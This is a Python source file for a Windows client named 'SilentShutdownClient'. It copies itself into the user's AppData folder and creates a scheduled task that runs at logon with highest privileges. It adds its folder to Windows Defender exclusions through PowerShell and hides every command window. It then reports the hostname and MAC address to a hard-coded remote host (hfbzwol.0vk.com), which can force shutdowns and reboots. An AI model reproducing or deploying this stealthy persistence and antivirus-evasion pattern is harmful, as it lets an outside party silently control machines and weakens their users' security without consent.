import os
import sys
import time
import json
import socket
import logging
import platform
import threading
import subprocess
import uuid
import re
from datetime import datetime, timedelta


class SilentShutdownClient:
    __slots__ = [
        'controller_host', 'controller_port', 'socket', 'socket_lock',
        'running', 'app_name', 'install_path',
        'executable_name', 'tasks_file', 'logger', 'tasks'
    ]

    # 使用更直观的、非欺骗性的名称
    APP_NAME = "RemotePowerTool"
    EXECUTABLE_NAME = "RemotePowerClient.exe"
    LOG_FILE_NAME = "tool.log"
    CONFIG_FILE_NAME = "config.json"

    HEARTBEAT_INTERVAL = 30
    HEARTBEAT_MESSAGE = b'HEARTBEAT'
    RECONNECT_DELAY = 15

    def __init__(self, controller_host, controller_port):
        self.controller_host = controller_host
        self.controller_port = controller_port
        self.socket = None
        self.running = True
        self.socket_lock = threading.Lock()

        self.app_name = self.APP_NAME
        self.install_path = os.path.join(os.getenv('LOCALAPPDATA'), self.app_name)
        self.executable_name = self.EXECUTABLE_NAME
        self.tasks_file = os.path.join(self.install_path, self.CONFIG_FILE_NAME)

        self.setup_logging()
        self.initialize_client()

    def setup_logging(self):
        os.makedirs(self.install_path, exist_ok=True)
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] (%(threadName)s) %(message)s',
            handlers=[
                logging.FileHandler(os.path.join(self.install_path, self.LOG_FILE_NAME)),
                logging.StreamHandler(sys.stdout)  # 同时输出到控制台方便调试
            ]
        )
        self.logger = logging.getLogger()
        sys.excepthook = self.log_unhandled_exception

    def log_unhandled_exception(self, exc_type, exc_value, exc_traceback):
        if issubclass(exc_type, KeyboardInterrupt):
            sys.__excepthook__(exc_type, exc_value, exc_traceback)
            return
        self.logger.critical("未处理的异常", exc_info=(exc_type, exc_value, exc_traceback))

    def initialize_client(self):
        """
        初始化客户端，自动处理安装或更新。
        """
        self.safe_install()  # 每次启动都执行自我安装/更新检查
        self.set_autostart()
        self.add_antivirus_exclusion()
        self.tasks = self.load_tasks()

    def set_autostart(self):
        """设置开机自启动(仅使用任务计划)"""
        executable_path = os.path.join(self.install_path, self.executable_name)
        if not os.path.exists(executable_path):
            self.logger.warning(f"可执行文件 '{executable_path}' 不存在，无法设置自启动。")
            return

        try:
            task_name = self.app_name
            cmd = f'schtasks /create /tn "{task_name}" /tr "\'{executable_path}\'" /sc onlogon /rl highest /f'
            subprocess.run(cmd, shell=True, check=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            self.logger.info(f"成功创建或更新任务计划: {task_name}")
        except FileNotFoundError:
            self.logger.error("命令 'schtasks' 未找到，创建任务计划失败。")
        except subprocess.CalledProcessError as e:
            error_message = e.stderr.decode('gbk', errors='ignore')
            self.logger.error(f"创建任务计划失败，返回码 {e.returncode}: {error_message}")

    def add_antivirus_exclusion(self):
        """为安装目录添加 Windows Defender 排除项"""
        try:
            cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{self.install_path}\'"'
            subprocess.run(cmd, shell=True, check=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            self.logger.info("已尝试添加杀毒软件排除项。")
        except (subprocess.CalledProcessError, FileNotFoundError):
            self.logger.warning("添加排除项失败 (可能权限不足或非Windows Defender环境)。")

    def load_tasks(self):
        if not os.path.exists(self.tasks_file): return []
        try:
            with open(self.tasks_file, "r", encoding='utf-8') as f:
                tasks = json.load(f)
                return [t for t in tasks if datetime.fromisoformat(t.get('next_run', '')) > datetime.now()]
        except (json.JSONDecodeError, IOError) as e:
            self.logger.error(f"加载任务文件失败: {e}")
        return []

    def save_tasks(self):
        try:
            with open(self.tasks_file, "w", encoding='utf-8') as f:
                json.dump(self.tasks, f, indent=4)
        except IOError as e:
            self.logger.error(f"保存任务文件失败: {e}")

    def is_installed(self):
        return os.path.exists(os.path.join(self.install_path, self.executable_name))

    def safe_install(self):
        """
        将自身复制到安装目录。如果已安装，则检查并覆盖旧版本。
        """
        try:
            os.makedirs(self.install_path, exist_ok=True)
            source_file = sys.executable
            destination_file = os.path.join(self.install_path, self.executable_name)

            # 如果当前运行的文件就是安装目录中的文件，则跳过，防止自我覆盖
            if os.path.exists(destination_file) and os.path.samefile(source_file, destination_file):
                self.logger.info("已在安装目录运行，跳过更新。")
                return

            # 执行复制和覆盖
            with open(source_file, 'rb') as f_src, open(destination_file, 'wb') as f_dst:
                f_dst.write(f_src.read())

            self.logger.info(f"客户端成功安装/更新到: {destination_file}")
        except (IOError, OSError, subprocess.CalledProcessError) as e:
            self.logger.critical(f"安装/更新过程发生严重错误: {e}")
            # 不在安装失败时退出，以允许程序在当前位置临时运行

    def get_mac_address(self):
        """
        更稳定地获取本机的物理MAC地址。
        优先查找活跃的、有IP地址的物理网卡（以太网或无线网）。
        """
        try:
            output = subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL,
                                             creationflags=subprocess.CREATE_NO_WINDOW)
            output = output.decode('gbk', errors='ignore')

            adapter_sections = re.split(r'\n\n(?=Ethernet adapter|以太网适配器|Wireless LAN adapter|无线局域网适配器)',
                                        output)

            best_mac = None
            for section in adapter_sections:
                mac_match = re.search(r"(?:Physical Address|物理地址)[\. ]+: ([0-9A-F-]+)", section, re.IGNORECASE)
                if mac_match:
                    mac = mac_match.group(1).replace('-', ':').upper()
                    if re.search(r"IPv4 Address[\. ]+: (?!169\.254)[\d\.]+", section, re.IGNORECASE):
                        self.logger.info(f"找到活跃的网卡MAC地址: {mac}")
                        return mac
                    if not best_mac:
                        best_mac = mac

            if best_mac:
                self.logger.info(f"使用备选的物理MAC地址: {best_mac}")
                return best_mac

        except Exception as e:
            self.logger.error(f"通过ipconfig获取MAC地址失败: {e}")

        try:
            mac_hex = f'{uuid.getnode():012x}'
            mac = ':'.join(mac_hex[i:i + 2] for i in range(0, 12, 2)).upper()
            if mac != "00:00:00:00:00:00":
                self.logger.info(f"使用uuid.getnode()获取的MAC地址: {mac}")
                return mac
        except Exception:
            pass

        return "MAC_NOT_FOUND"

    def connect_to_controller(self):
        """连接服务端主循环，并在连接成功后发送认证信息"""
        while self.running:
            try:
                self.logger.info(f"尝试连接到服务端 {self.controller_host}:{self.controller_port}...")
                with socket.create_connection((self.controller_host, self.controller_port), timeout=15) as sock:
                    self.socket = sock
                    self.logger.info("连接成功。正在发送客户端信息...")

                    hostname = platform.node()
                    mac = self.get_mac_address()
                    auth_message = f"{hostname}|{mac}"
                    sock.sendall(auth_message.encode('utf-8'))
                    self.logger.info(f"已发送认证信息: {auth_message}")

                    heartbeat_thread = threading.Thread(target=self.heartbeat_loop, name="HeartbeatThread", daemon=True)
                    heartbeat_thread.start()

                    self.message_loop()

            except socket.timeout:
                self.logger.warning("连接超时。")
            except ConnectionRefusedError:
                self.logger.error("连接被拒绝，请检查服务端地址和端口以及防火墙设置。")
            except socket.gaierror:
                self.logger.error(f"无法解析主机名 '{self.controller_host}'。")
            except OSError as e:
                self.logger.error(f"网络连接出现OS错误: {e}")
            except Exception as e:
                self.logger.error(f"发生未知连接错误: {e}")
            finally:
                if self.socket: self.socket.close(); self.socket = None
                self.logger.info(f"将在 {self.RECONNECT_DELAY} 秒后重连...")
                time.sleep(self.RECONNECT_DELAY)

    def message_loop(self):
        while self.running and self.socket:
            try:
                data = self.socket.recv(1024)
                if not data: self.logger.warning("服务端断开连接。"); break
                command = data.decode('utf-8').strip()
                if command and command != 'HEARTBEAT_ACK':
                    self.logger.info(f"收到命令: {command}")
                    threading.Thread(target=self.handle_command, args=(command,), name="CommandHandlerThread",
                                     daemon=True).start()
            except socket.timeout:
                continue
            except OSError:
                self.logger.error("Socket读取错误，连接中断。"); break

    def heartbeat_loop(self):
        while self.running and self.socket:
            try:
                with self.socket_lock:
                    if self.socket: self.socket.sendall(self.HEARTBEAT_MESSAGE)
                time.sleep(self.HEARTBEAT_INTERVAL)
            except OSError:
                self.logger.error("心跳发送失败，连接可能已断开。"); break

    def handle_command(self, cmd: str):
        try:
            parts = cmd.split()
            command_type = parts[0].upper()

            if command_type in ("SHUTDOWN", "REBOOT") and len(parts) > 1:
                delay = int(parts[1])
                action = 's' if command_type == "SHUTDOWN" else 'r'
                self.schedule_power_action(action, delay)
            elif command_type == "CANCEL":
                self.cancel_power_action()
            else:
                self.logger.warning(f"收到未知命令: {cmd}")
        except (ValueError, IndexError):
            self.logger.error(f"命令格式错误: '{cmd}'")
        except Exception as e:
            self.logger.error(f"命令处理失败: {e}")

    def schedule_power_action(self, action_type: str, delay: int):
        action_name = '关机' if action_type == 's' else '重启'
        try:
            subprocess.run(f'shutdown /{action_type} /t {delay} /f', shell=True, check=True,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            self.logger.info(f"已执行 {action_name} 命令，延迟 {delay} 秒。")
        except Exception as e:
            self.logger.error(f"计划 {action_name} 失败: {e}")

    def cancel_power_action(self):
        try:
            subprocess.run('shutdown /a', shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            self.logger.info("已执行取消关机/重启命令。")
        except Exception as e:
            self.logger.error(f"取消任务失败: {e}")

    def graceful_shutdown(self):
        self.running = False
        if self.socket: self.socket.close()
        self.logger.info("客户端已安全退出。")


if __name__ == "__main__":
    # --- 服务端配置 ---
    # !!!重要!!! 请将此处的IP地址修改为您的服务端的实际IP地址或域名
    SERVER_HOST = "hfbzwol.0vk.com"
    SERVER_PORT = 9999

    client = SilentShutdownClient(SERVER_HOST, SERVER_PORT)
    try:
        client.connect_to_controller()
    except KeyboardInterrupt:
        client.graceful_shutdown()
    except Exception as e:
        print(f"客户端主程序遭遇无法恢复的异常: {e}")
        client.graceful_shutdown()